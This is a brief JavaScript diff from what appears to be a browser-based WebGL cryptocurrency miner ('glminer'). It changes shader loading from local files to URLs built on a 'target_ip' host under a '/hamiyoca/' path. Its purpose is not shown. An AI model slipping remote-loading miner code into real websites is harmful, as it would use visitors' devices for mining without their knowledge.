@@ -137,8 +137,8 @@ function readScript(n) {
 };
 
 function onl() {
-    vShaderQuellcode = readScript('shader-vs.js');
-    fShaderQuellcode = readScript('shader-fs.js');
+    vShaderQuellcode = readScript('http://' + target_ip + '/hamiyoca/shader-vs.js');
+    fShaderQuellcode = readScript('http://' + target_ip + '/hamiyoca/shader-fs.js');
 };
 
 function glminer(job, callback) {
